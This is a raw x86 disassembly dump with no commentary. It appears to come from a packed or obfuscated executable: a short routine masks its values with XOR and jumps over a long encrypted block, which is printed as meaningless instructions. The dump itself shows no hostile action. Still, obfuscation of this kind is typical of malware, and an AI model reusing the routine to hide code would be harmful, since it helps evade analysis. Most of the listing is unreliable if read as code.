  4072ef:	mov    eax,ds:0x413bde
  4072f4:	mov    eax,DWORD PTR [eax+0x18c]
  4072fa:	mov    eax,DWORD PTR [eax]
  4072fc:	mov    DWORD PTR [ebp-0x18],eax
  4072ff:	mov    DWORD PTR [ebp-0x10],ebx
  407302:	mov    DWORD PTR [ebp-0x10],ebx
  407305:	mov    DWORD PTR [ebp-0x10],ebx
  407308:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  40730f:	mov    DWORD PTR [ebp-0x28],ebx
  407312:	mov    DWORD PTR [ebp-0x28],0xf89c8539
  407319:	mov    ebx,DWORD PTR [ebp-0x8]
  40731c:	xor    ebx,esi
  40731e:	add    ebx,edi
  407320:	jmp    0x40735b
  407325:	mov    eax,DWORD PTR [ebp-0x4]
  407328:	xor    eax,esi
  40732a:	lea    eax,[eax+ebx*1+0x32729b]
  407331:	push   eax
  407332:	mov    eax,DWORD PTR [ebp-0x10]
  407335:	xor    eax,esi
  407337:	lea    eax,[ebp+eax*1+0x3272a3]
  40733e:	push   eax
  40733f:	mov    eax,ds:0x413bde
  407344:	push   DWORD PTR [eax+0x1bc]
  40734a:	call   0x410353
  40734f:	mov    eax,DWORD PTR [ebp-0x4]
  407352:	xor    eax,esi
  407354:	lea    ebx,[ebx+eax*1+0x32729b]
  40735b:	mov    eax,DWORD PTR [ebp-0x4]
  40735e:	mov    ecx,DWORD PTR [ebp-0x4]
  407361:	xor    ecx,esi
  407363:	xor    eax,esi
  407365:	add    eax,ecx
  407367:	mov    ecx,DWORD PTR [ebp-0x4]
  40736a:	xor    ecx,esi
  40736c:	lea    eax,[eax+ecx*1+0x9757d1]
  407373:	cmp    ebx,eax
  407375:	jbe    0x407325
  40737b:	mov    eax,DWORD PTR [ebp+0xc]
  40737e:	mov    ds:0x413a62,eax
  407383:	mov    eax,DWORD PTR [ebp+0x10]
  407386:	mov    ds:0x413cb6,eax
  40738b:	mov    eax,ds:0x413a62
  407390:	mov    ecx,DWORD PTR [ebp-0x14]
  407393:	push   DWORD PTR [ebp-0x18]
  407396:	sub    eax,edi
  407398:	push   DWORD PTR [ebp-0x1c]
  40739b:	xor    eax,esi
  40739d:	mov    DWORD PTR [ecx],eax
  40739f:	push   DWORD PTR [ebp-0x20]
  4073a2:	call   0x40e344
  4073a7:	sub    eax,edi
  4073a9:	xor    eax,esi
  4073ab:	mov    DWORD PTR [ebp+0xc],eax
  4073ae:	mov    ecx,DWORD PTR [ebp-0x4]
  4073b1:	mov    eax,DWORD PTR [ebp+0xc]
  4073b4:	xor    ecx,esi
  4073b6:	add    ecx,edi
  4073b8:	xor    edx,edx
  4073ba:	div    ecx
  4073bc:	mov    ecx,DWORD PTR [ebp-0x8]
  4073bf:	cmp    ecx,eax
  4073c1:	jne    0x4073cc
  4073c7:	call   0x401000
  4073cc:	lea    eax,[ebp+0x4]
  4073cf:	mov    DWORD PTR [ebp-0x24],eax
  4073d2:	mov    eax,ds:0x413bde
  4073d7:	push   0x4
  4073d9:	add    eax,0x1cc
  4073de:	push   eax
  4073df:	lea    eax,[ebp-0xc]
  4073e2:	push   eax
  4073e3:	call   0x410353
  4073e8:	mov    eax,DWORD PTR [ebp-0xc]
  4073eb:	mov    eax,DWORD PTR [ebp-0x4]
  4073ee:	mov    eax,DWORD PTR [ebp-0x8]
  4073f1:	mov    DWORD PTR [ebp+0xc],eax
  4073f4:	mov    eax,ds:0x413c62
  4073f9:	mov    ecx,DWORD PTR [ebp+0xc]
  4073fc:	sub    eax,edi
  4073fe:	xor    eax,esi
  407400:	cmp    eax,ecx
  407402:	je     0x407449
  407408:	mov    eax,ds:0x413c5a
  40740d:	mov    ecx,DWORD PTR [ebp+0xc]
  407410:	sub    eax,edi
  407412:	xor    eax,esi
  407414:	cmp    eax,ecx
  407416:	jne    0x40742c
  40741c:	mov    eax,ds:0x413c62
  407421:	add    eax,DWORD PTR ds:0x413c5a
  407427:	jmp    0x407433
  40742c:	mov    eax,DWORD PTR [ebp+0xc]
  40742f:	xor    eax,esi
  407431:	add    eax,edi
  407433:	mov    ds:0x413c5a,eax
  407438:	mov    eax,DWORD PTR [ebp+0xc]
  40743b:	xor    eax,esi
  40743d:	add    eax,edi
  40743f:	mov    ds:0x413c62,eax
  407444:	jmp    0x407453
  407449:	mov    eax,ds:0x413c62
  40744e:	mov    ds:0x413c5a,eax
  407453:	mov    eax,DWORD PTR [ebp-0x24]
  407456:	mov    ecx,DWORD PTR ds:0x413c5a
  40745c:	add    DWORD PTR [eax],ecx
  40745e:	mov    eax,DWORD PTR [ebp-0xc]
  407461:	mov    eax,DWORD PTR [eax]
  407463:	pop    edi
  407464:	pop    esi
  407465:	pop    ebx
  407466:	leave  
  407467:	ret    0xc
  40746a:	push   ebp
  40746b:	mov    ebp,esp
  40746d:	push   ecx
  40746e:	push   ecx
  40746f:	mov    DWORD PTR ds:0x4337ef,edi
  407475:	mov    eax,0x5a3fc98
  40747a:	movzx  ecx,WORD PTR ds:0x4337af
  407481:	mov    DWORD PTR [ebp-0x4],eax
  407484:	jmp    0x4077cf
  407489:	shl    DWORD PTR [edi],0x5f
  40748c:	sbb    DWORD PTR [ecx+0x61],ebx
  40748f:	inc    ecx
  407490:	out    0xc2,eax
  407492:	jle    0x40743d
  407494:	inc    ebx
  407495:	nop
  407496:	push   ebx
  407497:	sbb    DWORD PTR [ebp+0x7e7ec0a4],esp
  40749d:	and    BYTE PTR [ebp+0x7e],bh
  4074a0:	jle    0x4074c3
  4074a2:	push   ds
  4074a3:	(bad)  
  4074a4:	fistp  WORD PTR [eax-0x3c87aa5c]
  4074aa:	adc    ch,BYTE PTR [ebp+0x19]
  4074ad:	aam    0x50
  4074af:	or     DWORD PTR [edi],ebx
  4074b1:	(bad)  
  4074b3:	xchg   DWORD PTR [ebx+eax*2+0x32],esi
  4074b7:	ss cmc 
  4074b9:	call   0xa013:0x144c6307
  4074c0:	jo     0x407499
  4074c2:	and    ebx,DWORD PTR ds:0x51fc287d
  4074c8:	rol    BYTE PTR ds:0x6c5eeebb,cl
  4074ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4074cf:	sbb    al,al
  4074d1:	push   edx
  4074d2:	aas    
  4074d3:	jmp    0x1e8:0xa7f993dc
  4074da:	cmc    
  4074db:	pop    ds
  4074dc:	inc    edx
  4074dd:	jae    0x4074fe
  4074df:	mov    al,ds:0x83d6beb7
  4074e4:	pop    eax
  4074e5:	pop    edi
  4074e6:	hlt    
  4074e7:	in     al,dx
  4074e8:	ja     0x407514
  4074ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074eb:	mov    esp,0x16ab793b
  4074f0:	rol    BYTE PTR [esp+esi*8+0x7547112a],0x2c
  4074f8:	sub    al,0x45
  4074fa:	imul   esi,esp,0xffffffb5
  4074fd:	cmp    al,dl
  4074ff:	jae    0x40756d
  407501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407502:	fcom   DWORD PTR [ecx+0x1e]
  407505:	test   al,0x8b
  407507:	(bad)  
  407508:	mov    dl,0xa8
  40750a:	(bad)  
  40750b:	retf   0xc157
  40750e:	push   0xffffff93
  407510:	test   eax,0xdf2c12d5
  407515:	pusha  
  407516:	and    al,0x54
  407518:	push   esi
  407519:	in     al,dx
  40751a:	push   es
  40751b:	cs pusha 
  40751d:	inc    ebx
  40751e:	stos   DWORD PTR es:[edi],eax
  40751f:	jmp    0xd1a8:0x1a0ba2da
  407526:	xor    DWORD PTR [ebx+eiz*4],0xd33bd1cd
  40752d:	call   0x51c1a140
  407532:	sub    al,0x84
  407534:	or     al,0xe3
  407536:	push   esi
  407537:	pop    es
  407538:	push   ebp
  407539:	pop    edx
  40753a:	fist   DWORD PTR [edi-0x5d]
  40753d:	cmp    ah,BYTE PTR [edx-0x5da0ac1d]
  407543:	jmp    0x5416b896
  407548:	adc    al,0xa7
  40754a:	push   ebx
  40754b:	pop    ebp
  40754c:	retf   0x821
  40754f:	aaa    
  407550:	les    ebp,FWORD PTR [eax-0x6ca5569b]
  407556:	ror    BYTE PTR [esp+eiz*8+0x4c],0xb
  40755b:	push   0xffffffed
  40755d:	pop    esp
  40755e:	mov    ds,edi
  407560:	pop    ebp
  407561:	pop    eax
  407562:	jb     0x4075df
  407564:	ss aas 
  407566:	pop    edx
  407567:	je     0x4075db
  407569:	stos   BYTE PTR es:[edi],al
  40756a:	or     ebp,edi
  40756c:	imul   ebx,DWORD PTR [esi+eax*2-0x28bfafeb],0xffffffe2
  407574:	or     al,ch
  407576:	mov    cl,0xc4
  407578:	mov    ebp,0x788725f3
  40757d:	cwde   
  40757e:	and    eax,0xf651f5f1
  407583:	mov    al,0x0
  407585:	jmp    0xaf72e628
  40758a:	push   esi
  40758b:	dec    BYTE PTR [eax+edi*2-0x1857f772]
  407592:	sbb    eax,0xb231f7cd
  407597:	in     eax,dx
  407598:	add    eax,0x95c18ec6
  40759d:	cmp    al,0x64
  40759f:	mov    esi,0x6a4add89
  4075a4:	ret    
  4075a5:	loopne 0x407614
  4075a7:	out    dx,al
  4075a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4075a9:	jbe    0x407598
  4075ab:	push   eax
  4075ac:	cmp    esi,ecx
  4075ae:	das    
  4075af:	cmp    eax,0x18dbcc35
  4075b4:	or     BYTE PTR [ebx-0x26c3720e],ch
  4075ba:	and    eax,0x3a720a6f
  4075bf:	xor    dl,BYTE PTR ds:0x72715d75
  4075c5:	rol    DWORD PTR [edi+0x23d9e2d5],0xeb
  4075cc:	sub    ecx,DWORD PTR [edx-0x63]
  4075cf:	push   ss
  4075d0:	jo     0x40760b
  4075d2:	inc    ecx
  4075d3:	mov    bh,0x2
  4075d5:	fcmovbe st,st(3)
  4075d7:	scas   eax,DWORD PTR es:[edi]
  4075d8:	xchg   ebx,eax
  4075d9:	sahf   
  4075da:	push   esp
  4075db:	inc    edx
  4075dc:	push   edx
  4075dd:	shr    DWORD PTR [edx+0xc0b89c1],1
  4075e3:	test   al,0x16
  4075e5:	add    DWORD PTR [ebx-0x6b],esi
  4075e8:	mov    al,0x4a
  4075ea:	jecxz  0x4075d8
  4075ec:	inc    edi
  4075ed:	popa   
  4075ee:	or     DWORD PTR [eax+edi*4+0x13bcf567],edi
  4075f5:	mov    edi,0x6f7bad8d
  4075fa:	adc    DWORD PTR [edx+0x48],0x64
  4075fe:	shl    BYTE PTR [eax-0x36],cl
  407601:	add    bh,0xed
  407604:	jmp    FWORD PTR [eax]
  407606:	push   es
  407607:	lds    ebx,FWORD PTR [ebp-0x52236f84]
  40760d:	and    al,0x76
  40760f:	adc    DWORD PTR [ebp+eiz*4+0x44c4df3b],0x50
  407617:	add    eax,0xf1369aee
  40761c:	push   0x63
  40761e:	outs   dx,BYTE PTR ds:[esi]
  40761f:	jmp    0x75b3:0x5e26c057
  407626:	es in  al,0xab
  407629:	mov    bl,BYTE PTR [esi+0x20]
  40762c:	sbb    al,0xb
  40762e:	cmp    bl,al
  407630:	popa   
  407631:	or     eax,0xb579f58c
  407636:	out    0xe0,eax
  407638:	ds int3 
  40763a:	je     0x407629
  40763c:	inc    edi
  40763d:	pop    ecx
  40763e:	jae    0x4075c4
  407640:	lods   eax,DWORD PTR ds:[esi]
  407641:	adc    ah,BYTE PTR [esi]
  407643:	jb     0x4076a8
  407645:	test   eax,0x5f01c015
  40764a:	xlat   BYTE PTR ds:[ebx]
  40764b:	outs   dx,BYTE PTR ds:[esi]
  40764c:	fcmovne st,st(2)
  40764e:	outs   dx,DWORD PTR ds:[esi]
  40764f:	mov    dl,0xfa
  407651:	outs   dx,DWORD PTR ds:[esi]
  407652:	xchg   ebx,eax
  407653:	dec    edx
  407654:	popa   
  407655:	pop    ss
  407656:	add    BYTE PTR [eax],bl
  407658:	inc    edx
  407659:	(bad)  
  40765a:	mov    edx,0x50e2fe3f
  40765f:	xchg   ebp,eax
  407660:	push   edx
  407661:	popa   
  407662:	sbb    eax,0x3e979967
  407667:	jl     0x4076ad
  407669:	adc    BYTE PTR [ecx-0x129361dd],bl
  40766f:	gs inc eax
  407671:	add    esi,edi
  407673:	inc    ebp
  407674:	and    DWORD PTR [eax],eax
  407676:	mov    DWORD PTR [esi+0x73],0xce58236a
  40767d:	xlat   BYTE PTR ds:[ebx]
  40767e:	mov    ebp,0xea07c8e9
  407683:	div    BYTE PTR [edi+edx*4-0x40956db7]
  40768a:	ss xor dl,0x55
  40768e:	push   es
  40768f:	dec    edi
  407690:	jle    0x407687
  407692:	and    DWORD PTR [ebp+0x79653d32],0xdbe98f10
  40769c:	gs pop edi
  40769e:	jns    0x4076f0
  4076a0:	icebp  
  4076a1:	xchg   edx,eax
  4076a2:	ja     0x40768a
  4076a4:	ds pop es
  4076a6:	iret   
  4076a7:	add    eax,0x8abc31f9
  4076ac:	imul   esp,DWORD PTR [esi+0x78dae1cd],0xfffffffa
  4076b3:	xchg   ecx,eax
  4076b4:	(bad)  
  4076b5:	mov    edi,0x9be20111
  4076ba:	push   cs
  4076bb:	add    bh,BYTE PTR [edx-0x5]
  4076be:	gs loope 0x407658
  4076c1:	sub    DWORD PTR ds:0xcd327524,0xffffffbc
  4076c8:	mov    ch,0xa7
  4076ca:	push   edi
  4076cb:	sbb    esp,ebp
  4076cd:	pop    edx
  4076ce:	xor    ecx,DWORD PTR [edi+0x41c5daaf]
  4076d4:	xchg   edx,eax
  4076d5:	cmc    
  4076d6:	adc    eax,0xccbe4cb3
  4076db:	cli    
  4076dc:	(bad)  
  4076dd:	fild   WORD PTR ds:0x338bebc6
  4076e3:	push   es
  4076e4:	lods   al,BYTE PTR ds:[esi]
  4076e5:	loopne 0x4076a1
  4076e7:	xor    al,0x3b
  4076e9:	mov    ch,0xa1
  4076eb:	xor    eax,0x6dff8104
  4076f0:	ret    0xb860
  4076f3:	inc    ebx
  4076f4:	mov    DWORD PTR [ebp-0x705bf9f0],esi
  4076fa:	xchg   DWORD PTR [esi],edi
  4076fc:	add    bl,dh
  4076fe:	inc    ebx
  4076ff:	clc    
  407700:	jge    0x40773c
  407702:	retf   
  407703:	rcl    BYTE PTR [ebx+0x52],cl
  407706:	mov    eax,0x9a4a4127
  40770b:	hlt    
  40770c:	mov    ecx,0xb2a22710
  407711:	out    0xb4,eax
  407713:	fstp   st(4)
  407715:	push   ds
  407716:	nop
  407717:	push   esp
  407718:	idiv   ebx
  40771a:	lea    ebx,[ecx+0x2d85b9d]
  407720:	std    
  407721:	cwde   
  407722:	sbb    ah,BYTE PTR [edi]
  407724:	cmp    ecx,DWORD PTR [ebx]
  407726:	repz shr DWORD PTR [edx],0x8d
  40772a:	or     eax,DWORD PTR ds:[ebp-0x2c]
  40772e:	push   ds
  40772f:	iret   
  407730:	mov    esp,esi
  407732:	or     eax,0x1c24fac
  407737:	mov    cl,0x99
  407739:	mov    edi,0xae862e2c
  40773e:	ss scas eax,DWORD PTR es:[edi]
  407740:	sub    BYTE PTR [ebx],ch
  407742:	and    cl,BYTE PTR [esi+0x79]
  407745:	pop    esp
  407746:	sub    DWORD PTR [esi-0x543b61b2],eax
  40774c:	mov    edx,0x2e7ed162
  407751:	adc    eax,0x69d42208
  407756:	mov    ah,0x7a
  407758:	lahf   
  407759:	test   BYTE PTR [eax-0x13],0x7c
  40775d:	je     0x4077a8
  40775f:	ds sub al,0x76
  407762:	mul    BYTE PTR [eax+0x76]
  407765:	cs mov esp,0xfa511a90
  40776b:	dec    esi
  40776c:	sub    BYTE PTR [eax-0xf],0x9f
  407770:	fisub  WORD PTR [edx+0x418d07c3]
  407776:	pop    ecx
  407777:	sahf   
  407778:	fdiv   QWORD PTR [edi+0x5c]
  40777b:	adc    ch,ah
  40777d:	aad    0x3f
  40777f:	mov    dh,cl
  407781:	add    esi,DWORD PTR ds:0x31498edd
  407787:	bound  esp,QWORD PTR [ebx+0x1cdd27ea]
  40778d:	lea    eax,[edx+0x789d0676]
  407793:	retf   
  407794:	xor    ch,BYTE PTR [eax+0x74]
  407797:	and    eax,0xf1311120
  40779c:	pop    ds
  40779d:	mov    dh,0x20
  40779f:	sub    BYTE PTR [ebx+0x46],ch
  4077a2:	in     eax,dx
  4077a3:	arpl   WORD PTR [eax-0x25],bx
  4077a6:	xor    al,0x33
  4077a8:	sub    edi,edx
  4077aa:	fnstsw WORD PTR [ebx+0xa00d167]
  4077b0:	sti    
  4077b1:	cmovne esi,DWORD PTR [ebp+0x6e]
  4077b5:	sub    al,0xd0
  4077b7:	icebp  
  4077b8:	mov    dl,0x60
  4077ba:	push   ebp
  4077bb:	mov    ds:0xf339a2b0,al
  4077c0:	mov    ds:0xf3ee970a,eax
  4077c5:	sub    al,0x20
  4077c7:	add    eax,0x2c066a94
  4077cc:	ins    DWORD PTR es:[edi],dx
  4077cd:	ror    WORD PTR [ebx+0x5c7fc4d],cl
  4077d4:	daa    
  4077d5:	cmp    BYTE PTR [ebx+0x0],al
  4077d8:	gs pop esi
  4077da:	add    BYTE PTR [eax],al
  4077dc:	mov    DWORD PTR [ebp-0x8],0x4ec1
  4077e3:	jmp    0x407b2e
  4077e8:	out    dx,eax
  4077e9:	psubd  mm2,QWORD PTR [ecx+0x5a]
  4077ed:	push   ecx
  4077ee:	cmc    
  4077ef:	mov    cl,0x14
  4077f1:	loop   0x40786d
  4077f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4077f4:	sub    BYTE PTR ds:0xcf56cbde,ch
  4077fa:	jle    0x40787a
  4077fc:	and    BYTE PTR [ebp+0x7e],bh
  4077ff:	jle    0x4077d6
  407801:	cdq    
  407802:	pop    esp
  407803:	adc    eax,0x7f0960a6
  407808:	pop    ecx
  407809:	push   cs
  40780a:	sbb    DWORD PTR [eax+edx*8-0x13],eax
  40780e:	pop    esp
  40780f:	fld    DWORD PTR [esi-0x689bab55]
  407815:	add    esi,DWORD PTR [edx]
  407817:	loop   0x407869
  407819:	mov    gs,WORD PTR [edi]
  40781b:	jb     0x4077ab
  40781d:	mov    edx,0x54283c96
  407822:	adc    eax,0x2ef222ae
  407827:	and    al,ch
  407829:	mov    ecx,0x48f45d0b
  40782e:	pusha  
  40782f:	mov    eax,0x13b0b306
  407834:	shl    DWORD PTR [edx-0x18],1
  407837:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407838:	fidiv  WORD PTR [esi-0x1c55d53b]
  40783e:	mul    DWORD PTR [ebp+0x47]
  407841:	jecxz  0x4077cc
  407843:	inc    ecx
  407844:	sub    cl,0xa7
  407847:	add    al,0x86
  407849:	aas    
  40784a:	and    eax,0x55e9e7e
  40784f:	jp     0x4077d4
  407851:	je     0x407882
  407853:	test   DWORD PTR [esi],eax
  407855:	(bad)  
  407856:	retf   0xb8da
  407859:	dec    edx
  40785a:	or     BYTE PTR [ebx+edx*1-0x3a],al
  40785e:	adc    ebx,DWORD PTR [ebx]
  407860:	aad    0x6
  407862:	xchg   edi,eax
  407863:	or     DWORD PTR [ecx+0x52703771],edx
  407869:	dec    edx
  40786a:	lods   eax,DWORD PTR ds:[esi]
  40786b:	repz or dl,BYTE PTR [ebx+0x6fe225af]
  407872:	adc    al,0x5
  407874:	push   edi
  407875:	(bad)  
  407877:	or     bh,cl
  407879:	xchg   ecx,eax
  40787a:	inc    edx
  40787b:	(bad)  
  40787c:	adc    ah,BYTE PTR [edx+0x59e91642]
  407882:	add    BYTE PTR [esi+0x1f],ah
  407885:	inc    esi
  407886:	inc    ebp
  407887:	int3   
  407888:	mov    cl,0x6b
  40788a:	pushf  
  40788b:	cmp    BYTE PTR [esi-0x66ff3d7b],ch
  407891:	dec    edx
  407892:	pop    ds
  407893:	outs   dx,BYTE PTR ds:[esi]
  407894:	enter  0x5769,0x36
  407898:	inc    DWORD PTR [eax]
  40789a:	jl     0x407877
  40789c:	sti    
  40789d:	clc    
  40789e:	xchg   esi,eax
  40789f:	sbb    al,0x37
  4078a1:	pop    eax
  4078a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4078a3:	(bad)
  4078a6:	or     edi,ebx
  4078a8:	xchg   ecx,eax
  4078a9:	scas   eax,DWORD PTR es:[edi]
  4078aa:	jle    0x407908
  4078ac:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  4078ae:	in     eax,dx
  4078af:	(bad)  
  4078b0:	es push 0xb2e0a18d
  4078b6:	jno    0x407899
  4078b8:	add    ecx,ebx
  4078ba:	cld    
  4078bb:	es jno 0x40790c
  4078be:	jle    0x407916
  4078c0:	out    0xaa,eax
  4078c2:	cmp    DWORD PTR [edi+0xa2f947c],ebp
  4078c8:	or     eax,0x26e60570
  4078cd:	push   ss
  4078ce:	jb     0x4078df
  4078d0:	mov    ecx,0x88e888d2
  4078d5:	stc    
  4078d6:	add    BYTE PTR [edx],ah
  4078d8:	loope  0x407958
  4078da:	pushw  0x3b0e
  4078de:	or     eax,0x944f5452
  4078e3:	and    ebx,ebx
  4078e5:	nop
  4078e6:	xor    BYTE PTR [eax+0x2b],cl
  4078e9:	mov    esp,0xc6839e
  4078ee:	dec    ebx
  4078ef:	xor    eax,0x1757c118
  4078f4:	pop    ebx
  4078f5:	pop    ecx
  4078f6:	pop    edx
  4078f7:	push   0xffffffca
  4078f9:	ja     0x4078fb
  4078fb:	jecxz  0x4078fd
  4078fd:	push   ebp
  4078fe:	or     BYTE PTR [ebx+ebx*1+0x21910755],bh
  407905:	pop    esi
  407906:	and    eax,0x1828f5ac
  40790b:	inc    ecx
  40790c:	mov    ecx,fs
  40790e:	hlt    
  40790f:	enter  0x3c5b,0xed
  407913:	sbb    BYTE PTR [ebx+0x53f5f010],bl
  407919:	mov    ah,0xe
  40791b:	test   al,0xc1
  40791d:	cmp    BYTE PTR [edx-0x31a1b9aa],ch
  407923:	xor    ebx,edx
  407925:	jb     0x407905
  407927:	ins    DWORD PTR es:[edi],dx
  407928:	sbb    BYTE PTR [ecx],dh
  40792a:	pop    edx
  40792b:	test   eax,0x5d390531
  407930:	or     al,0xb6
  407932:	sbb    eax,0x7a918ef7
  407937:	cmp    ebx,ecx
  407939:	inc    BYTE PTR [esi]
  40793b:	(bad)  
  40793c:	jae    0x407966
  40793e:	push   0x5a
  407940:	fucomip st,st(7)
  407942:	out    0xf8,eax
  407944:	(bad)  
  407945:	out    dx,eax
  407946:	fimul  DWORD PTR [edi+0x2c]
  407949:	jne    0x407906
  40794b:	pushf  
  40794c:	jmp    FWORD PTR [edx-0x62]
  40794f:	pop    edi
  407950:	in     eax,dx
  407951:	lahf   
  407952:	jne    0x407951
  407954:	cdq    
  407955:	mov    BYTE PTR [edi-0x62471dad],bh
  40795b:	rcl    al,0xe1
  40795e:	mov    esp,ebp
  407960:	mov    ch,0x29
  407962:	sub    esi,eax
  407964:	cmp    eax,0xbe0ed10d
  407969:	addr16 je 0x407962
  40796c:	(bad)  
  40796d:	push   ds
  40796e:	cwde   
  40796f:	arpl   WORD PTR [esi+0x11],dx
  407972:	dec    eax
  407973:	rol    DWORD PTR [eax+eax*2],cl
  407976:	out    dx,eax
  407977:	fdivp  st(4),st
  407979:	push   0x61
  40797b:	in     al,0xa5
  40797d:	mov    bh,0xc4
  40797f:	dec    edi
  407980:	xchg   edi,eax
  407981:	mov    esi,esi
  407983:	out    0x7a,eax
  407985:	mov    al,ds:0x346842
  40798a:	inc    esi
  40798b:	inc    edx
  40798c:	outs   dx,BYTE PTR ds:[esi]
  40798d:	mov    edx,0xbcd4e171
  407992:	rcr    ecx,1
  407994:	pop    esi
  407995:	inc    esi
  407996:	mov    dl,0xa1
  407998:	pop    DWORD PTR [edx]
  40799a:	xor    bl,dl
  40799c:	jmp    0x6e92aae1
  4079a1:	mov    bh,0xf2
  4079a3:	sbb    ebp,ebp
  4079a5:	sub    al,al
  4079a7:	add    eax,0x4f344aa3
  4079ac:	scas   eax,DWORD PTR es:[edi]
  4079ad:	add    eax,0xf8b2106d
  4079b2:	test   al,0xc6
  4079b4:	loope  0x40796a
  4079b6:	and    eax,DWORD PTR [eax+0x39]
  4079b9:	dec    eax
  4079ba:	xlat   BYTE PTR ds:[ebx]
  4079bb:	sbb    eax,0xe20b8dd2
  4079c0:	cmp    eax,0x733dbfe4
  4079c5:	arpl   dx,sp
  4079c7:	mov    cl,0x9e
  4079c9:	sar    DWORD PTR [edx+0x5862c23c],0x16
  4079d0:	jecxz  0x407a0d
  4079d2:	sbb    BYTE PTR ds:0xb09baaa5,0xab
  4079d9:	xchg   edi,eax
  4079da:	xchg   ecx,eax
  4079db:	or     esi,DWORD PTR [esp+edi*8+0x68e828e7]
  4079e2:	dec    ebp
  4079e3:	inc    eax
  4079e4:	dec    ebx
  4079e5:	(bad)
  4079eb:	xchg   ecx,eax
  4079ec:	adc    cl,BYTE PTR [edx+0x16]
  4079ef:	fisub  WORD PTR [ebp-0x65]
  4079f2:	inc    ebp
  4079f3:	stc    
  4079f4:	pusha  
  4079f5:	or     BYTE PTR [ebx+0x2b],cl
  4079f8:	jno    0x407a45
  4079fa:	mov    dh,0x38
  4079fc:	sub    eax,0x9665cfe0
  407a01:	sti    
  407a02:	in     eax,dx
  407a03:	shl    al,1
  407a05:	push   edx
  407a06:	ror    DWORD PTR [edi-0x10],1
  407a09:	fisttp WORD PTR [esi+0x4cf3bb05]
  407a0f:	imul   eax,edx,0x3533381c
  407a15:	into   
  407a16:	xor    al,0x1d
  407a18:	int3   
  407a19:	(bad)  
  407a1a:	cmp    ebp,eax
  407a1c:	lods   al,BYTE PTR ds:[esi]
  407a1d:	cmp    ebx,ebx
  407a1f:	add    eax,0xab8bcdbd
  407a24:	dec    eax
  407a25:	cmp    eax,0x1e5cd3a3
  407a2a:	aad    0x37
  407a2c:	inc    DWORD PTR [ecx]
  407a2e:	push   edx
  407a2f:	in     eax,0xc1
  407a31:	mov    esp,0xd9d02564
  407a36:	imul   eax,DWORD PTR ds:0xd1e4cc3,0xffffff86
  407a3d:	aas    
  407a3e:	or     eax,0x73db291c
  407a43:	ficomp WORD PTR [esi+0x71]
  407a46:	in     eax,dx
  407a47:	scas   al,BYTE PTR es:[edi]
  407a48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a4a:	(bad)  
  407a4b:	mov    ds:0x6231e697,eax
  407a50:	mov    ebx,0xb6c2cfdb
  407a55:	(bad)  
  407a56:	stos   DWORD PTR es:[edi],eax
  407a57:	hlt    
  407a58:	adc    ebx,DWORD PTR [ecx]
  407a5a:	imul   ebx,DWORD PTR [ecx-0xe],0xfa21d2cc
  407a61:	mov    BYTE PTR [edi+0x7e],al
  407a64:	mov    ebp,0x15a73f1d
  407a69:	add    BYTE PTR [edi+0x2a0511ee],ch
  407a6f:	in     al,0x35
  407a71:	inc    ebx
  407a72:	pusha  
  407a73:	fcom   DWORD PTR [edx+ebx*2-0x6]
  407a77:	ins    BYTE PTR es:[edi],dx
  407a78:	dec    ebx
  407a79:	mov    ecx,0x10368a8c
  407a7e:	das    
  407a7f:	lea    esi,[ecx+0x6d6a5880]
  407a85:	fsubr  DWORD PTR [ebx+0xedbcd12]
  407a8b:	cmp    eax,DWORD PTR [ebx]
  407a8d:	push   edi
  407a8e:	aad    0x61
  407a90:	cmp    al,0xae
  407a92:	sub    eax,0x55868da6
  407a97:	out    dx,eax
  407a98:	stos   DWORD PTR es:[edi],eax
  407a99:	iret   
  407a9a:	ja     0x407a49
  407a9c:	sar    BYTE PTR ds:[ecx+0x70],cl
  407aa0:	jmp    0xebdb:0x6908
  407aa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407aa7:	popa   
  407aa8:	xchg   ecx,eax
  407aa9:	je     0x407aa5
  407aab:	test   eax,0x4080ccf7
  407ab0:	sbb    DWORD PTR [ebx*2+0x61f9e8ec],edx
  407ab7:	aam    0x8a
  407ab9:	into   
  407aba:	xchg   edx,eax
  407abb:	arpl   WORD PTR [ecx],cx
  407abd:	cmove  ecx,DWORD PTR [esi]
  407ac0:	pusha  
  407ac1:	mov    eax,ds:0xa582888c
  407ac6:	pusha  
  407ac7:	dec    ecx
  407ac8:	xor    DWORD PTR [ebp+0x24],edi
  407acb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407acc:	in     al,0xb0
  407ace:	and    eax,0x505110f0
  407ad3:	fucomip st,st(1)
  407ad5:	pop    ds
  407ad6:	ins    BYTE PTR es:[edi],dx
  407ad7:	inc    ebp
  407ad8:	dec    edi
  407ad9:	sahf   
  407ada:	pop    ecx
  407adb:	pop    cx
  407add:	xor    eax,0xdd72ba6c
  407ae2:	call   0x25:0x73435d72
  407ae9:	push   ds
  407aea:	mov    ah,BYTE PTR [esi]
  407aec:	fcom   st(2)
  407aee:	outs   dx,BYTE PTR ds:[esi]
  407aef:	push   ebx
  407af0:	mov    ebp,0x58a2aa3b
  407af5:	out    0x59,al
  407af7:	mov    eax,0x991093bb
  407afc:	fcomp  DWORD PTR [esi]
  407afe:	mov    al,ds:0xa5306245
  407b03:	push   eax
  407b04:	pop    edx
  407b05:	push   es
  407b06:	mov    ah,BYTE PTR ss:0x3ed3e77c
  407b0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b0e:	(bad)
  407b11:	push   ecx
  407b12:	pop    edx
  407b13:	pop    es
  407b14:	outs   dx,BYTE PTR ds:[esi]
  407b15:	mov    DWORD PTR [ebx],eax
  407b17:	mov    esp,0xd9ac9e73
  407b1c:	or     al,ah
  407b1e:	cmc    
  407b1f:	sbb    esp,DWORD PTR ds:0xd31f4d31
  407b25:	push   ecx
  407b26:	add    DWORD PTR ds:0xbc9695e,ebx
  407b2c:	xor    BYTE PTR [edi],bl
  407b2e:	cmp    ecx,eax
